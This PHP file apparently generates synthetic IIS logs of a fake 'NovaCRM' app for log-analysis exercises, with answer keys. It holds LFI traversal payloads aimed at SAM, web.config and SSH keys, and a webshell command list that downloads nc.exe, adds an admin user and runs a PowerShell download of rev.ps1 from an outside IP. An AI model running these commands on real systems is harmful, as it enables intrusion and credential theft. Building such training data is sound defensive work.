<?php
/**
 * Pulse Generator — IIS W3C Extended Log
 * Fake corporate app "NovaCRM" running on IIS
 */

require_once __DIR__ . '/config.php';

/**
 * Generate IIS W3C header
 */
function getIisHeader($startTime) {
    return sprintf(IIS_HEADER, $startTime->format('Y-m-d H:i:s'));
}

/**
 * Generate IIS noise traffic
 */
function generateIisNoise($count, $startTime, $endTime) {
    $lines = [];
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();
    $ips = LEGIT_IPS;
    $generated = 0;
    $sessionCount = max(1, intval($count / 8));

    for ($s = 0; $s < $sessionCount && $generated < $count; $s++) {
        $sessionIp = pick($ips);
        $sessionUa = pick(IIS_USER_AGENTS);
        $sessionStart = mt_rand($startTs, max($startTs, $endTs - 300));
        $currentTs = $sessionStart;
        $requestsInSession = mt_rand(3, 12);

        for ($r = 0; $r < $requestsInSession && $generated < $count; $r++) {
            $pathEntry = pick(IIS_NORMAL_PATHS);
            $method = $pathEntry[0];
            $uriStem = $pathEntry[1];
            $uriQuery = $pathEntry[2];
            $status = $pathEntry[3];
            $timeTaken = mt_rand(15, 3000);

            $ts = new DateTime();
            $ts->setTimestamp($currentTs);

            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatIisLogLine(
                    $ts, IIS_SERVER_IP, $method, $uriStem, $uriQuery,
                    80, '-', $sessionIp, $sessionUa, '-',
                    $status, 0, 0, $timeTaken
                ),
            ];

            $currentTs += mt_rand(1, 30);
            $generated++;
        }
    }

    return $lines;
}

/**
 * IIS LFI payloads (ASP.NET style)
 */
function getIisLfiPayloads($difficulty) {
    $basic = [
        ['..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 200],
        ['..\\..\\..\\windows\\system32\\drivers\\etc\\networks', 200],
        ['..\\..\\..\\windows\\win.ini', 200],
        ['..\\..\\..\\windows\\system.ini', 200],
        ['..\\..\\..\\inetpub\\wwwroot\\web.config', 200],
        ['..\\..\\..\\inetpub\\wwwroot\\NovaCRM\\web.config', 200],
        ['..%5c..%5c..%5cwindows%5cwin.ini', 200],
        ['..%5c..%5c..%5cinetpub%5cwwwroot%5cweb.config', 200],
        ['....\\\\....\\\\....\\\\windows\\\\win.ini', 200],
        ['..%252f..%252f..%252fwindows%252fwin.ini', 200],
        ['C:\\windows\\system32\\drivers\\etc\\hosts', 200],
        ['C:\\inetpub\\wwwroot\\web.config', 200],
        ['C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex260115.log', 200],
    ];

    $intermediate = [
        ['..\\..\\..\\windows\\system32\\config\\SAM', 403],
        ['..\\..\\..\\windows\\system32\\config\\SYSTEM', 403],
        ['..\\..\\..\\windows\\repair\\SAM', 200],
        ['..\\..\\..\\xampp\\passwords.txt', 200],
        ['..\\..\\..\\Program+Files\\Microsoft+SQL+Server\\MSSQL16.MSSQLSERVER\\MSSQL\\DATA\\master.mdf', 200],
        ['..\\..\\..\\Users\\Administrator\\.ssh\\id_rsa', 200],
        ['..\\..\\..\\Users\\Administrator\\Desktop\\passwords.txt', 200],
        ['..%255c..%255c..%255cwindows%255cwin.ini', 200],
        ['..%c0%af..%c0%af..%c0%afwindows\\win.ini', 200],
        ['..\\..\\..\\inetpub\\wwwroot\\NovaCRM\\App_Data\\NovaCRM.mdf', 200],
    ];

    $advanced = [
        ['..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config', 200],
        ['..\\..\\..\\windows\\system32\\inetsrv\\config\\administration.config', 200],
        ['..\\..\\..\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config', 200],
        ['..\\..\\..\\windows\\debug\\NetSetup.LOG', 200],
        ['..\\..\\..\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys', 200],
        ['..\\..\\..\\Users\\All+Users\\Microsoft\\Windows\\Start+Menu\\Programs\\Startup', 200],
        ['..\\..\\..\\windows\\system32\\LogFiles\\httperr\\httperr1.log', 200],
    ];

    switch ($difficulty) {
        case 'easy': return $basic;
        case 'medium': return array_merge($basic, $intermediate);
        case 'hard': return array_merge($basic, $intermediate, $advanced);
        default: return array_merge($basic, $intermediate);
    }
}

/**
 * Generate IIS LFI attack
 */
function generateIisLfi($attackerCount, $difficulty, $startTime, $endTime) {
    $lines = [];
    $answers = [
        'type' => 'LFI (Local File Inclusion)',
        'vector' => '/Content/Page?view=',
        'attacker_ips' => [],
        'targeted_files' => [],
    ];

    $attackerIps = pickN(ATTACKER_IP_POOL, $attackerCount);
    $payloads = getIisLfiPayloads($difficulty);
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();
    $answers['attacker_ips'] = $attackerIps;

    foreach ($attackerIps as $ip) {
        $ua = pick(IIS_ATTACKER_AGENTS);
        $attackStart = mt_rand($startTs, intval($startTs + ($endTs - $startTs) * 0.5));
        $currentTs = $attackStart;

        $selected = $payloads;
        shuffle($selected);
        $cnt = match($difficulty) {
            'easy' => mt_rand(6, 12), 'medium' => mt_rand(12, 20), 'hard' => mt_rand(18, count($selected)), default => mt_rand(12, 20),
        };
        $selected = array_slice($selected, 0, $cnt);

        foreach ($selected as $payload) {
            $uriQuery = 'view=' . $payload[0];
            $status = $payload[1];
            $targetedFile = urldecode($payload[0]);
            if (!in_array($targetedFile, $answers['targeted_files'])) {
                $answers['targeted_files'][] = $targetedFile;
            }

            $ts = new DateTime();
            $ts->setTimestamp($currentTs);

            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatIisLogLine(
                    $ts, IIS_SERVER_IP, 'GET', '/Content/Page', $uriQuery,
                    80, '-', $ip, $ua, '-',
                    $status, 0, 0, mt_rand(15, 500)
                ),
            ];
            $currentTs += mt_rand(1, 8);
        }
    }

    return ['lines' => $lines, 'answers' => $answers];
}

/**
 * Generate IIS bruteforce attack
 */
function generateIisBruteforce($attackerCount, $difficulty, $startTime, $endTime) {
    $lines = [];
    $answers = [
        'type' => 'HTTP Bruteforce',
        'target' => '/Account/Login',
        'attacker_ips' => [],
        'total_attempts_per_ip' => [],
        'success' => [],
    ];

    $attackerIps = pickN(ATTACKER_IP_POOL, $attackerCount);
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();
    $answers['attacker_ips'] = $attackerIps;

    $attemptRanges = match($difficulty) {
        'easy' => [50, 120], 'medium' => [30, 80], 'hard' => [15, 40], default => [30, 80],
    };
    $delayRanges = match($difficulty) {
        'easy' => [1, 2], 'medium' => [2, 8], 'hard' => [5, 25], default => [2, 8],
    };

    foreach ($attackerIps as $ip) {
        $ua = pick(IIS_ATTACKER_AGENTS);
        $attempts = mt_rand($attemptRanges[0], $attemptRanges[1]);
        $answers['total_attempts_per_ip'][$ip] = $attempts;
        $attackStart = mt_rand($startTs, $startTs + intval(($endTs - $startTs) * 0.6));
        $currentTs = $attackStart;
        $successAttempt = mt_rand(intval($attempts * 0.7), $attempts - 1);

        for ($a = 0; $a < $attempts; $a++) {
            $isSuccess = ($a === $successAttempt);
            $status = $isSuccess ? 302 : 200;
            $ts = new DateTime();
            $ts->setTimestamp($currentTs);

            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatIisLogLine(
                    $ts, IIS_SERVER_IP, 'POST', '/Account/Login', '-',
                    80, '-', $ip, $ua, '/Account/Login',
                    $status, 0, 0, mt_rand(100, 2000)
                ),
            ];

            if ($isSuccess) {
                $answers['success'][] = ['ip' => $ip, 'attempt_number' => $a + 1];
            }
            $currentTs += mt_rand($delayRanges[0], $delayRanges[1]);
        }
    }

    // Legit login noise
    for ($l = 0; $l < mt_rand(2, 5); $l++) {
        $legitIp = pick(LEGIT_IPS);
        $legitUa = pick(IIS_USER_AGENTS);
        $legitTime = mt_rand($startTs, $endTs - 30);

        for ($f = 0; $f < mt_rand(1, 2); $f++) {
            $ts = new DateTime(); $ts->setTimestamp($legitTime);
            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatIisLogLine($ts, IIS_SERVER_IP, 'POST', '/Account/Login', '-', 80, '-', $legitIp, $legitUa, '/Account/Login', 200, 0, 0, mt_rand(200, 1500)),
            ];
            $legitTime += mt_rand(10, 25);
        }
        $ts = new DateTime(); $ts->setTimestamp($legitTime);
        $lines[] = [
            'timestamp' => clone $ts,
            'line' => formatIisLogLine($ts, IIS_SERVER_IP, 'POST', '/Account/Login', '-', 80, '-', $legitIp, $legitUa, '/Account/Login', 302, 0, 0, mt_rand(100, 500)),
        ];
    }

    return ['lines' => $lines, 'answers' => $answers];
}

/**
 * Generate IIS webshell attack
 */
function generateIisWebshell($attackerCount, $difficulty, $startTime, $endTime) {
    $lines = [];
    $answers = [
        'type' => 'Webshell',
        'shell_paths' => ['/Uploads/Products/cache-handler.ashx'],
        'attacker_ips' => [],
        'commands_executed' => [],
    ];

    $attackerIps = pickN(ATTACKER_IP_POOL, $attackerCount);
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();
    $answers['attacker_ips'] = $attackerIps;

    // Windows command chain
    $cmds = [
        ['whoami', 'whoami'], ['hostname', 'hostname'],
        ['ipconfig /all', 'ipconfig+/all'],
        ['systeminfo', 'systeminfo'],
        ['net user', 'net+user'],
        ['net localgroup administrators', 'net+localgroup+administrators'],
        ['netstat -ano', 'netstat+-ano'],
        ['tasklist', 'tasklist'],
        ['dir C:\\inetpub\\wwwroot', 'dir+C%3A%5Cinetpub%5Cwwwroot'],
        ['type C:\\inetpub\\wwwroot\\NovaCRM\\web.config', 'type+C%3A%5Cinetpub%5Cwwwroot%5CNovaCRM%5Cweb.config'],
        ['reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'reg+query+HKLM%5CSOFTWARE%5CMicrosoft%5CWindows%5CCurrentVersion%5CRun'],
        ['certutil -urlcache -split -f http://185.156.73.54/nc.exe C:\\Windows\\Temp\\nc.exe', 'certutil+-urlcache+-split+-f+http%3A%2F%2F185.156.73.54%2Fnc.exe+C%3A%5CWindows%5CTemp%5Cnc.exe'],
        ['net user hacker P@ssw0rd123 /add', 'net+user+hacker+P%40ssw0rd123+%2Fadd'],
        ['net localgroup administrators hacker /add', 'net+localgroup+administrators+hacker+%2Fadd'],
        ['powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://185.156.73.54/rev.ps1\')"', 'powershell+-ep+bypass+-c+%22IEX(New-Object+Net.WebClient).DownloadString(%27http%3A%2F%2F185.156.73.54%2Frev.ps1%27)%22'],
    ];

    $cmdCount = match($difficulty) {
        'easy' => mt_rand(5, 8), 'medium' => mt_rand(8, 12), 'hard' => count($cmds), default => mt_rand(8, 12),
    };

    foreach ($attackerIps as $ip) {
        $ua = pick(IIS_ATTACKER_AGENTS);
        $attackStart = mt_rand($startTs + intval(($endTs - $startTs) * 0.3), $startTs + intval(($endTs - $startTs) * 0.6));
        $currentTs = $attackStart;

        $selected = array_slice($cmds, 0, $cmdCount);
        foreach ($selected as $cmd) {
            $answers['commands_executed'][] = $cmd[0];
            $ts = new DateTime();
            $ts->setTimestamp($currentTs);

            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatIisLogLine(
                    $ts, IIS_SERVER_IP, 'GET', '/Uploads/Products/cache-handler.ashx', 'c=' . $cmd[1],
                    80, '-', $ip, $ua, '-',
                    200, 0, 0, mt_rand(50, 5000)
                ),
            ];
            $currentTs += (mt_rand(1, 4) === 1) ? mt_rand(1, 5) : mt_rand(8, 45);
        }
    }

    $answers['commands_executed'] = array_values(array_unique($answers['commands_executed']));
    return ['lines' => $lines, 'answers' => $answers];
}
